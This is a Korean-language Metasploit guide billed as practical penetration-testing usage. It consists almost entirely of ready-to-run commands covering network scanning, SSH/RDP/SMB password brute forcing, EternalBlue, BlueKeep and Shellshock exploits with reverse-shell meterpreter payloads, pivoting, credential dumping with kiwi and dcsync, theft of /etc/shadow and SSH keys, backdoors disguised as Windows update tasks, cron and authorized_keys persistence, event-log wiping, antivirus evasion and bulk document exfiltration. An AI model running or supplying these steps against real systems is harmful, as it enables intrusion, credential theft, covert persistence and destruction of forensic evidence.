# Metasploit 실전 공격 가이드 (현업 사용법)

## 실무 환경 설정

### 필수 초기 설정 (시간 절약)

```bash
# 배너 없이 빠른 시작
msfconsole -q

# 자주 사용하는 IP 글로벌 설정 (한 번 설정하면 계속 유지)
msf6 > setg LHOST 10.10.14.50    # 공격자 IP
msf6 > setg RHOSTS 10.10.10.100  # 타겟 IP (변경 필요시만)

# 데이터베이스 연결 확인 (성능상 필수)
msf6 > db_status
```

### 워크스페이스 실무 활용

```bash
# 프로젝트별 분리 (실무에서 필수)
msf6 > workspace -a client_pentest_2025
msf6 > workspace client_pentest_2025

# 스캔 결과 자동 임포트
msf6 > db_import /root/nmap_results.xml
msf6 > hosts           # 타겟 확인
msf6 > services        # 서비스 확인
```

## 실전 정찰 및 스캔

### 빠른 네트워크 정찰

```bash
# 실제로 많이 쓰는 스캐너들
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5900,8080
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > run

# SMB 정보 수집 (Windows 환경에서 90% 사용)
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

# SMB 공유 확인 (접근 가능한 공유 찾기)
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumshares) > run
```

### 웹 애플리케이션 스캔

```bash
# 디렉토리 브루트포스 (실무에서 매우 효과적)
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/dir_scanner) > set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
msf6 auxiliary(scanner/http/dir_scanner) > run

# WordPress 사이트 스캔
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/wordpress_scanner) > run
```

## 크리덴셜 공격 (실무 핵심)

### SSH 브루트포스 (가장 효과적)

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false
msf6 auxiliary(scanner/ssh/ssh_login) > run

# 사용자명 리스트 사용
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

### RDP 브루트포스

```bash
msf6 > use auxiliary/scanner/rdp/rdp_scanner
msf6 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/rdp/rdp_scanner) > run

# RDP 로그인 시도
msf6 > use auxiliary/scanner/rdp/ms12_020_check
msf6 auxiliary(scanner/rdp/ms12_020_check) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/rdp/ms12_020_check) > run
```

### SMB 인증 공격

```bash
# SMB 로그인 브루트포스
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser administrator
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/smb/smb_login) > run
```

## 실제 익스플로잇 (현업 자주 사용)

### EternalBlue (Windows 7/2008/2012)

```bash
# 취약점 확인
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

# 익스플로잇 실행
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### BlueKeep (Windows RDP)

```bash
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.1.100
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
```

### Linux SSH 공격

```bash
# SSH 키 기반 공격 (키 파일 있을 때)
msf6 > use auxiliary/scanner/ssh/ssh_login_pubkey
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set KEY_PATH /root/.ssh/id_rsa
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > run
```

### 웹 익스플로잇

```bash
# Shellshock (매우 효과적)
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.1.100
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.cgi
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

# PHP 업로드 공격
msf6 > use exploit/multi/http/php_utility_belt_rce
msf6 exploit(multi/http/php_utility_belt_rce) > set RHOSTS 192.168.1.100
msf6 exploit(multi/http/php_utility_belt_rce) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(multi/http/php_utility_belt_rce) > exploit
```

## 실무 페이로드 설정

### 안정적인 페이로드 조합

```bash
# Windows (가장 안정적)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Linux (가장 호환성 좋음)
set PAYLOAD linux/x86/meterpreter/reverse_tcp

# PHP 웹쉘 (웹앱 공격시)
set PAYLOAD php/meterpreter/reverse_tcp

# Python (대부분 환경에서 작동)
set PAYLOAD python/meterpreter/reverse_tcp
```

### 방화벽 우회 페이로드

```bash
# HTTP/HTTPS 터널링 (방화벽 우회에 효과적)
set PAYLOAD windows/meterpreter/reverse_http
set LURI /admin/login

# HTTPS (암호화된 통신)
set PAYLOAD windows/meterpreter/reverse_https
```

## 멀티핸들러 실무 운용

### 다중 세션 관리 (실무 필수)

```bash
# 백그라운드에서 리스너 실행
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z    # 백그라운드 실행

# 다른 포트로 추가 리스너
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > exploit -j -z

# 작업 상태 확인
msf6 > jobs
msf6 > sessions
```

## 네트워크 피벗팅 (실무 핵심)

### 내부 네트워크 접근

```bash
# 첫 번째 시스템 장악 후
meterpreter > run autoroute -s 192.168.100.0/24

# 백그라운드 세션으로 전환
meterpreter > background

# SOCKS 프록시 설정
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j

# proxychains 설정 후 다른 도구 사용
proxychains nmap -sT 192.168.100.1-50 -p 22,80,443,3389
```

### 포트포워딩 실무 활용

```bash
# RDP 포트 포워딩
meterpreter > portfwd add -l 3390 -p 3389 -r 192.168.100.10

# SSH 포트 포워딩
meterpreter > portfwd add -l 2222 -p 22 -r 192.168.100.20

# 웹 서버 포트 포워딩
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.100.30

# 로컬에서 접근
rdesktop 127.0.0.1:3390    # RDP 접근
ssh root@127.0.0.1 -p 2222 # SSH 접근
```

## 크리덴셜 수집 (고급)

### Windows 크리덴셜 덤핑

```bash
# 권한 상승 후
meterpreter > getsystem

# Kiwi 로드 (현업에서 필수)
meterpreter > load kiwi

# 모든 크리덴셜 덤프
meterpreter > creds_all

# 특정 계정 덤프
meterpreter > creds_msv

# 도메인 해시 덤프
meterpreter > dcsync_ntlm krbtgt
meterpreter > dcsync_ntlm administrator
```

### Linux 크리덴셜 수집

```bash
# /etc/passwd 및 /etc/shadow 수집
meterpreter > download /etc/passwd
meterpreter > download /etc/shadow

# SSH 키 수집
meterpreter > download /home/user/.ssh/id_rsa
meterpreter > download /root/.ssh/id_rsa

# 히스토리 파일 수집
meterpreter > download /home/user/.bash_history
meterpreter > download /root/.bash_history
```

## 지속성 확보 (실무 방법)

### Windows 지속성

```bash
# 가장 은밀한 방법: 정당한 서비스 이용
meterpreter > upload /root/backdoor.exe C:\\Windows\\System32\\backdoor.exe
meterpreter > reg setval -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "Windows Security Update" -t REG_SZ -d "C:\\Windows\\System32\\backdoor.exe"

# 스케줄 작업 생성
meterpreter > execute -f cmd.exe -a "/c schtasks /create /tn \"Windows Update Check\" /tr \"C:\\Windows\\System32\\backdoor.exe\" /sc minute /mo 30" -H
```

### Linux 지속성

```bash
# Cron 작업 추가
meterpreter > execute -f bash -a "-c 'echo \"*/10 * * * * /tmp/.update\" >> /var/spool/cron/crontabs/root'" -H

# SSH 키 추가
meterpreter > execute -f bash -a "-c 'mkdir -p /root/.ssh && echo \"ssh-rsa AAAAB3Nza...\" >> /root/.ssh/authorized_keys'" -H
```

## 로그 삭제 및 흔적 제거

### Windows 로그 삭제

```bash
# 이벤트 로그 전체 삭제
meterpreter > clearev

# 특정 로그만 삭제
meterpreter > execute -f cmd.exe -a "/c wevtutil cl Security" -H
meterpreter > execute -f cmd.exe -a "/c wevtutil cl System" -H
```

### Linux 로그 삭제

```bash
# 주요 로그 파일 삭제
meterpreter > rm /var/log/auth.log
meterpreter > rm /var/log/secure
meterpreter > rm /var/log/messages
meterpreter > rm /root/.bash_history

# 현재 세션 히스토리 삭제
meterpreter > execute -f bash -a "-c 'history -c'" -H
```

## 실무 팁 및 주의사항

### 세션 안정화

```bash
# 안정적인 프로세스로 마이그레이션 (필수)
meterpreter > ps | grep explorer.exe
meterpreter > migrate 1234

# 여러 통신 채널 설정 (백업 연결)
meterpreter > transport add -t reverse_tcp -l 192.168.1.50 -p 4445
```

### 탐지 회피

```bash
# 메모리에서만 실행 (파일 생성 안함)
meterpreter > execute -f payload.exe -m

# 타이밍 조절 (너무 빠른 실행 피하기)
meterpreter > sleep 5

# AV 우회를 위한 인코딩
msf6 > set EnableStageEncoding true
msf6 > set StageEncoder x86/shikata_ga_nai
```

### 데이터 수집 최적화

```bash
# 중요 파일만 선별적 다운로드
meterpreter > search -f *.doc -d C:\\Users\\
meterpreter > search -f *.pdf -d C:\\Users\\
meterpreter > search -f password* -d C:\\

# 압축해서 다운로드 (시간 절약)
meterpreter > execute -f cmd.exe -a "/c rar a -r C:\\temp\\data.rar C:\\Users\\Administrator\\Documents\\*" -H
meterpreter > download C:\\temp\\data.rar
```

이 가이드는 실제 모의해킹에서 90% 이상 사용되는 기능들만 정리했습니다. 이론적인 내용보다는 바로 써먹을 수 있는 실무 중심으로 구성했습니다.
